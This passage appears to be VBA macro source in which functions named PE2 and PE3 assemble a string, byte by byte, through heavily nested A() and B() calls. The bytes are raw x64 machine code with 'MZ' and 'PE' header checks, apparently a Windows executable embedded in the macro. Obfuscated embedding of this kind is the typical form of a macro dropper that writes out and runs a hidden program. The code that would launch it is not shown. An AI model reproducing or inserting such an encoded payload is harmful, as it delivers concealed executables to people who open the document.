    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 185), 8), 0), 0), 0), 232), "TU"), 0), 0), "H"), 131), 248), 1), "u"), 212), 186), 1), 0), 0), 0), 185), 8), 0), 0), 0), 232), "?U"), 0), 0), 184), 255), 255), 255), 255), 233), 18), 255), 255), 255), 15), 31), "D"), 0), 0), "1"), 210), 185), 11)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 232), "$U"), 0), 0), "H"), 131), 248), 1), "t1H"), 133), 192), 15), 132), "L"), 255), 255), 255), 185), 11), 0), 0), 0), 255), 208), 184), 255), 255), 255), 255), 233), 225), 254), 255), 255), 186), 1), 0), 0), 0), 185), 4), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 232), 245), "T"), 0), 0), 131), 200), 255), 233), 202), 254), 255), 255), 186), 1), 0), 0), 0), 185), 11), 0), 0), 0), 232), 222), "T"), 0), 0), 131), 200), 255), 233), 179), 254), 255), 255), 144), 144), 144), 144), 144), 144), "ATWVSH"), 131), 236)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "(H"), 141), 13), 224), 172), 0), 0), 255), 21), 250), 189), 0), 0), "H"), 139), 29), 179), 172), 0), 0), "H"), 133), 219), "t2H"), 139), "=O"), 190), 0), 0), "H"), 139), "5"), 248), 189), 0), 0), 139), 11), 255), 215), "I"), 137), 196), 255), 214), 133)
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(strPE, 192), "u"), 14), "M"), 133), 228), "t"), 9), "H"), 139), "C"), 8), "L"), 137), 225), 255), 208), "H"), 139), "["), 16), "H"), 133), 219), "u"), 220), "H"), 141), 13), 149), 172), 0), 0), "H"), 131), 196), "([^_A\H"), 255), "%"), 237), 189), 0), 0), 15)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 31), "D"), 0), 0), "WVSH"), 131), 236), " "), 139), 5), "["), 172), 0), 0), 137), 207), "H"), 137), 214), 133), 192), "u"), 10), "H"), 131), 196), " [^_"), 195), "f"), 144), 186), 24), 0), 0), 0), 185), 1), 0), 0), 0), 232), 129), "T"), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 0), "H"), 137), 195), "H"), 133), 192), "t<"), 137), "8H"), 141), 13), "@"), 172), 0), 0), "H"), 137), "p"), 8), 255), 21), "V"), 189), 0), 0), "H"), 139), 5), 15), 172), 0), 0), "H"), 141), 13), "("), 172), 0), 0), "H"), 137), 29), 1), 172), 0), 0), "H")
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 137), "C"), 16), 255), 21), 127), 189), 0), 0), "1"), 192), "H"), 131), 196), " [^_"), 195), 131), 200), 255), 235), 158), 15), 31), 132), 0), 0), 0), 0), 0), "SH"), 131), 236), " "), 139), 5), 221), 171), 0), 0), 137), 203), 133), 192), "u"), 15), "1")
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 192), "H"), 131), 196), " ["), 195), 15), 31), 128), 0), 0), 0), 0), "H"), 141), 13), 217), 171), 0), 0), 255), 21), 243), 188), 0), 0), "H"), 139), 13), 172), 171), 0), 0), "H"), 133), 201), "t*1"), 210), 235), 14), 15), 31), 0), "H"), 137), 202), "H")
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 133), 192), "t"), 27), "H"), 137), 193), 139), 1), "9"), 216), "H"), 139), "A"), 16), "u"), 235), "H"), 133), 210), "t&H"), 137), "B"), 16), 232), 173), "S"), 0), 0), "H"), 141), 13), 150), 171), 0), 0), 255), 21), 248), 188), 0), 0), "1"), 192), "H"), 131), 196), " ")
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "["), 195), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 137), 5), "Y"), 171), 0), 0), 235), 213), 15), 31), 128), 0), 0), 0), 0), "SH"), 131), 236), " "), 131), 250), 2), "tFw,"), 133), 210), "tP"), 139), 5), "B"), 171), 0), 0), 133), 192)
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 15), 132), 178), 0), 0), 0), 199), 5), "0"), 171), 0), 0), 1), 0), 0), 0), 184), 1), 0), 0), 0), "H"), 131), 196), " ["), 195), 15), 31), "D"), 0), 0), 131), 250), 3), "u"), 235), 139), 5), 21), 171), 0), 0), 133), 192), "t"), 225), 232), "4"), 254)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 255), 255), 235), 218), "f"), 144), 232), 139), 247), 255), 255), 184), 1), 0), 0), 0), "H"), 131), 196), " ["), 195), 139), 5), 242), 170), 0), 0), 133), 192), "uV"), 139), 5), 232), 170), 0), 0), 131), 248), 1), "u"), 179), "H"), 139), 29), 212), 170), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "H"), 133), 219), "t"), 24), 15), 31), 128), 0), 0), 0), 0), "H"), 137), 217), "H"), 139), "["), 16), 232), 236), "R"), 0), 0), "H"), 133), 219), "u"), 239), "H"), 141), 13), 208), 170), 0), 0), "H"), 199), 5), 165), 170), 0), 0), 0), 0), 0), 0), 199), 5), 163)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 170), 0), 0), 0), 0), 0), 0), 255), 21), 205), 187), 0), 0), 233), "h"), 255), 255), 255), 232), 187), 253), 255), 255), 235), 163), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 141), 13), 153), 170), 0), 0), 255), 21), 235), 187), 0), 0), 233), "<"), 255)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "1"), 192), "f"), 129), "9MZu"), 15), "HcQ<H"), 1), 209), 129), "9PE"), 0), 0), "t"), 8), 195), 15), 31), 128), 0), 0), 0), 0), "1"), 192)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "f"), 129), "y"), 24), 11), 2), 15), 148), 192), 195), 15), 31), "@"), 0), "HcA<I"), 137), 208), "H"), 141), 20), 8), 15), 183), "B"), 20), "H"), 141), "D"), 2), 24), 15), 183), "R"), 6), 133), 210), "t0"), 131), 234), 1), "H"), 141), 20), 146), "L")
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 141), "L"), 208), "("), 15), 31), 132), 0), 0), 0), 0), 0), 139), "H"), 12), "H"), 137), 202), "L9"), 193), "w"), 8), 3), "P"), 8), "L9"), 194), "w"), 11), "H"), 131), 192), "(L9"), 200), "u"), 228), "1"), 192), 195), 144), "ATVSH"), 131)
    strPE = A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 236), " H"), 137), 203), 232), 192), "Q"), 0), 0), "H"), 131), 248), 8), "wzH"), 139), 21), 163), 129), 0), 0), "E1"), 228), "f"), 129), ":MZuWHcB<H"), 1), 208), 129), "8PE"), 0), 0), "uHf"), 129)
    strPE = B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(strPE, "x"), 24), 11), 2), "u@"), 15), 183), "P"), 20), "L"), 141), "d"), 16), 24), 15), 183), "@"), 6), 133), 192), "tA"), 131), 232), 1), "H"), 141), 4), 128), "I"), 141), "t"), 196), "("), 235), 12), 15), 31), 0), "I"), 131), 196), "(I9"), 244), "t'A")
    strPE = B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 184), 8), 0), 0), 0), "H"), 137), 218), "L"), 137), 225), 232), "NQ"), 0), 0), 133), 192), "u"), 226), "L"), 137), 224), "H"), 131), 196), " [^A\"), 195), "f"), 15), 31), "D"), 0), 0), "E1"), 228), "L"), 137), 224), "H"), 131), 196), " [^")
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "A\"), 195), 144), "H"), 139), 21), 25), 129), 0), 0), "1"), 192), "f"), 129), ":MZu"), 16), "LcB<I"), 1), 208), "A"), 129), "8PE"), 0), 0), "t"), 8), 195), 15), 31), 128), 0), 0), 0), 0), "fA"), 129), "x"), 24), 11)
    strPE = B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(strPE, 2), "u"), 239), "A"), 15), 183), "@"), 20), "H)"), 209), "A"), 15), 183), "P"), 6), "I"), 141), "D"), 0), 24), 133), 210), "t."), 131), 234), 1), "H"), 141), 20), 146), "L"), 141), "L"), 208), "("), 15), 31), "D"), 0), 0), "D"), 139), "@"), 12), "L"), 137), 194), "L")
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(strPE, "9"), 193), "r"), 8), 3), "P"), 8), "H9"), 209), "r"), 180), "H"), 131), 192), "(L9"), 200), "u"), 227), "1"), 192), 195), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 139), 5), 153), 128), 0), 0), "E1"), 192), "f"), 129), "8MZu"), 15), "H")
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(strPE, "cP<H"), 1), 208), 129), "8PE"), 0), 0), "t"), 8), "D"), 137), 192), 195), 15), 31), "@"), 0), "f"), 129), "x"), 24), 11), 2), "u"), 240), "D"), 15), 183), "@"), 6), "D"), 137), 192), 195), 15), 31), 128), 0), 0), 0), 0), "L"), 139), 5), "Y")
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 128), 0), 0), "1"), 192), "fA"), 129), "8MZu"), 15), "IcP<L"), 1), 194), 129), ":PE"), 0), 0), "t"), 8), 195), 15), 31), 128), 0), 0), 0), 0), "f"), 129), "z"), 24), 11), 2), "u"), 240), 15), 183), "B"), 20), "H"), 141)

    PE2 = strPE
End Function

Private Function PE3() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "D"), 2), 24), 15), 183), "R"), 6), 133), 210), "t'"), 131), 234), 1), "H"), 141), 20), 146), "H"), 141), "T"), 208), "("), 15), 31), 0), 246), "@' t"), 9), "H"), 133), 201), "t"), 197), "H"), 131), 233), 1), "H"), 131), 192), "(H9"), 208), "u"), 232)
    strPE = A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "1"), 192), 195), 15), 31), "D"), 0), 0), "H"), 139), 5), 233), 127), 0), 0), "E1"), 192), "f"), 129), "8MZu"), 15), "HcP<H"), 1), 194), 129), ":PE"), 0), 0), "t"), 8), "L"), 137), 192), 195), 15), 31), "@"), 0), "f"), 129)
    strPE = B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(strPE, "z"), 24), 11), 2), "L"), 15), "D"), 192), "L"), 137), 192), 195), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 139), 5), 169), 127), 0), 0), "E1"), 192), "f"), 129), "8MZu"), 15), "HcP<H"), 1), 194), 129), ":PE")
    strPE = B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "t"), 8), "D"), 137), 192), 195), 15), 31), "@"), 0), "f"), 129), "z"), 24), 11), 2), "u"), 240), "H)"), 193), 15), 183), "B"), 20), "H"), 141), "D"), 2), 24), 15), 183), "R"), 6), 133), 210), "t"), 220), 131), 234), 1), "H"), 141), 20), 146), "L"), 141), "L")
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(strPE, 208), "(D"), 139), "@"), 12), "L"), 137), 194), "L9"), 193), "r"), 8), 3), "P"), 8), "H9"), 209), "r"), 20), "H"), 131), 192), "(I9"), 193), "u"), 227), "E1"), 192), "D"), 137), 192), 195), 15), 31), "@"), 0), "D"), 139), "@$A"), 247), 208), "A")
    strPE = A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 193), 232), 31), "D"), 137), 192), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 139), 29), 25), 127), 0), 0), "E1"), 201), "fA"), 129), ";MZu"), 16), "McC<M"), 1), 216), "A"), 129), "8PE"), 0), 0), "t"), 14)
    strPE = B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "L"), 137), 200), 195), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "fA"), 129), "x"), 24), 11), 2), "u"), 233), "A"), 139), 128), 144), 0), 0), 0), 133), 192), "t"), 222), "A"), 15), 183), "P"), 20), "I"), 141), "T"), 16), 24), "E"), 15), 183), "@"), 6), "E")
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(strPE, 133), 192), "t"), 202), "A"), 131), 232), 1), "O"), 141), 4), 128), "N"), 141), "T"), 194), "("), 15), 31), 0), "D"), 139), "J"), 12), "M"), 137), 200), "L9"), 200), "r"), 9), "D"), 3), "B"), 8), "L9"), 192), "r"), 19), "H"), 131), 194), "(I9"), 210), "u"), 226)
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(strPE, "E1"), 201), "L"), 137), 200), 195), 15), 31), 0), "L"), 1), 216), 235), 10), 15), 31), 0), 131), 233), 1), "H"), 131), 192), 20), "D"), 139), "@"), 4), "E"), 133), 192), "u"), 7), 139), "P"), 12), 133), 210), "t"), 215), 133), 201), 127), 229), "D"), 139), "H"), 12), "M")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 1), 217), "L"), 137), 200), 195), 144), 144), "QPH="), 0), 16), 0), 0), "H"), 141), "L$"), 24), "r"), 25), "H"), 129), 233), 0), 16), 0), 0), "H"), 131), 9), 0), "H-"), 0), 16), 0), 0), "H="), 0), 16), 0), 0), "w"), 231), "H)")
    strPE = B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 193), "H"), 131), 9), 0), "XY"), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "AUATSH"), 131), 236), "0L"), 137), 195), "I"), 137), 204), "I"), 137), 213), 232), "YT"), 0), 0), "H"), 137), "\$ ")
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "M"), 137), 233), "E1"), 192), "L"), 137), 226), 185), 0), "`"), 0), 0), 232), "a"), 28), 0), 0), "L"), 137), 225), "A"), 137), 197), 232), 166), "T"), 0), 0), "D"), 137), 232), "H"), 131), 196), "0[A\A]"), 195), 144), 144), 144), 144), 144), 144), 144)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(strPE, 144), 144), "H"), 131), 236), "XD"), 139), "Z"), 8), "L"), 139), 18), "L"), 137), 216), "f%"), 255), 127), 15), 133), 144), 0), 0), 0), "M"), 137), 211), 15), 183), "B"), 8), "I"), 193), 235), " E"), 9), 218), "tpE"), 133), 219), 15), 137), 207), 0), 0)
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 0), "A"), 137), 194), 199), "D$D"), 1), 0), 0), 0), "fA"), 129), 226), 255), 127), "fA"), 129), 234), ">@E"), 15), 191), 210), 15), 31), "@"), 0), "%"), 0), 128), 0), 0), "L"), 139), 156), "$"), 128), 0), 0), 0), "A"), 137), 3), "H"), 141)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "D$HL"), 137), "L$0L"), 141), "L$DD"), 137), "D$(I"), 137), 208), "D"), 137), 210), 137), "L$ H"), 141), 13), 203), "d"), 0), 0), "H"), 137), "D$8"), 232), 193), "'"), 0), 0), "H"), 131), 196), "X"), 195)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 15), 31), "@"), 0), 199), "D$D"), 0), 0), 0), 0), "E1"), 210), 235), 171), 15), 31), 0), "f="), 255), 127), "t"), 18), 15), 183), "B"), 8), 233), "z"), 255), 255), 255), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 137), 208), "H"), 193), 232)
    strPE = A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(strPE, " %"), 255), 255), 255), 127), "D"), 9), 208), "t"), 23), 199), "D$D"), 4), 0), 0), 0), "E1"), 210), "1"), 192), 233), "r"), 255), 255), 255), 15), 31), "D"), 0), 0), 199), "D$D"), 3), 0), 0), 0), 15), 183), "B"), 8), "E1"), 210), 233)
    strPE = B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "T"), 255), 255), 255), 15), 31), "@"), 0), 199), "D$D"), 2), 0), 0), 0), "A"), 186), 195), 191), 255), 255), 233), "="), 255), 255), 255), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), "f"), 144), "SH"), 131), 236), " H"), 137), 211), 139), "R")
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 8), 246), 198), "@u"), 8), 139), "C$9C(~"), 19), "L"), 139), 3), 128), 230), " u HcC$A"), 136), 12), 0), 139), "C$"), 131), 192), 1), 137), "C$H"), 131), 196), " ["), 195), "f"), 15), 31), 132), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "L"), 137), 194), 232), 192), "L"), 0), 0), 139), "C$"), 131), 192), 1), 137), "C$H"), 131), 196), " ["), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "AVAUATUWVSH"), 131), 236), "@")
    strPE = A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(strPE, "L"), 141), "l$(L"), 141), "d$0L"), 137), 195), "H"), 137), 205), 137), 215), "M"), 137), 232), "1"), 210), "L"), 137), 225), 232), 227), "P"), 0), 0), 139), "C"), 16), 133), 192), "x"), 5), "9"), 199), 15), "O"), 248), 139), "C"), 12), "9"), 248), 15), 143)
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 197), 0), 0), 0), 199), "C"), 12), 255), 255), 255), 255), 133), 255), 15), 142), 252), 0), 0), 0), 15), 31), "D"), 0), 0), 15), 183), "U"), 0), "M"), 137), 232), "L"), 137), 225), "H"), 131), 197), 2), 232), 165), "P"), 0), 0), 133), 192), "~~"), 131), 232), 1)
    strPE = B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "L"), 137), 230), "M"), 141), "t"), 4), 1), 235), 26), 15), 31), "@"), 0), "HcC$A"), 136), 12), 0), 139), "C$"), 131), 192), 1), 137), "C$L9"), 246), "t6"), 139), "S"), 8), "H"), 131), 198), 1), 246), 198), "@u"), 8), 139), "C")
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(strPE, "$9C(~"), 225), 15), 190), "N"), 255), "L"), 139), 3), 128), 230), " t"), 202), "L"), 137), 194), 232), 234), "K"), 0), 0), 139), "C$"), 131), 192), 1), 137), "C$L9"), 246), "u"), 202), 131), 239), 1), "u"), 135), 139), "C"), 12), 141), "P")
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 255), 137), "S"), 12), 133), 192), "~"), 28), "f"), 144), "H"), 137), 218), 185), " "), 0), 0), 0), 232), 179), 254), 255), 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), 127), 230), "H"), 131), 196), "@[^_]A\A]A^")
    strPE = A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 195), ")"), 248), 137), "C"), 12), 246), "C"), 9), 4), "u+"), 131), 232), 1), 137), "C"), 12), "f"), 15), 31), "D"), 0), 0), "H"), 137), 218), 185), " "), 0), 0), 0), 232), "s"), 254), 255), 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), "u"), 230)
    strPE = B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 233), 12), 255), 255), 255), 133), 255), 15), 143), 17), 255), 255), 255), 131), 232), 1), 137), "C"), 12), 235), 145), 199), "C"), 12), 254), 255), 255), 255), 235), 162), 15), 31), 132), 0), 0), 0), 0), 0), "WVSH"), 131), 236), " A"), 139), "@"), 16), "H")
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(strPE, 137), 206), 137), 215), "L"), 137), 195), 133), 192), "x"), 5), "9"), 194), 15), "O"), 248), 139), "C"), 12), "9"), 248), 15), 143), 193), 0), 0), 0), 199), "C"), 12), 255), 255), 255), 255), 133), 255), 15), 132), 159), 0), 0), 0), 139), "C"), 8), 131), 239), 1), "H"), 1)
    strPE = B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 247), 235), "#"), 15), 31), 128), 0), 0), 0), 0), "HcC$"), 136), 12), 2), 139), "S$"), 131), 194), 1), 137), "S$H9"), 247), "tD"), 139), "C"), 8), "H"), 131), 198), 1), 246), 196), "@u"), 8), 139), "S$9S(~")
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 225), 15), 190), 14), "H"), 139), 19), 246), 196), " t"), 204), 232), 199), "J"), 0), 0), 139), "S$"), 235), 204), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "HcC$"), 198), 4), 2), " "), 139), "S$"), 131), 194), 1), 137), "S$"), 139)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), "~."), 139), "C"), 8), 246), 196), "@u"), 8), 139), "S$9S(~"), 221), "H"), 139), 19), 246), 196), " t"), 202), 185), " "), 0), 0), 0), 232), "xJ"), 0), 0), 139), "S$"), 235)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(strPE, 198), 199), "C"), 12), 254), 255), 255), 255), "H"), 131), 196), " [^_"), 195), 15), 31), "@"), 0), ")"), 248), 137), "C"), 12), 137), 194), 139), "C"), 8), 246), 196), 4), "u)"), 141), "B"), 255), 137), "C"), 12), 15), 31), 0), "H"), 137), 218), 185), " "), 0)
    strPE = B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(strPE, 0), 0), 232), "3"), 253), 255), 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), "u"), 230), 233), 15), 255), 255), 255), 144), 133), 255), 15), 133), 17), 255), 255), 255), 131), 234), 1), 137), "S"), 12), 235), 129), "ATSH"), 131), 236), "(H")
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 141), 5), 210), "u"), 0), 0), "I"), 137), 204), "H"), 133), 201), "H"), 137), 211), "HcR"), 16), "L"), 15), "D"), 224), "L"), 137), 225), 133), 210), "x"), 26), 232), "%I"), 0), 0), "H"), 137), 194), "I"), 137), 216), "L"), 137), 225), "H"), 131), 196), "([A")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "\"), 233), 144), 254), 255), 255), 232), 139), "I"), 0), 0), 235), 228), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 131), 236), "8E"), 139), "H"), 8), "A"), 199), "@"), 16), 255), 255), 255), 255), "I"), 137), 210), 133), 201), "tI"), 198), "D$,-")
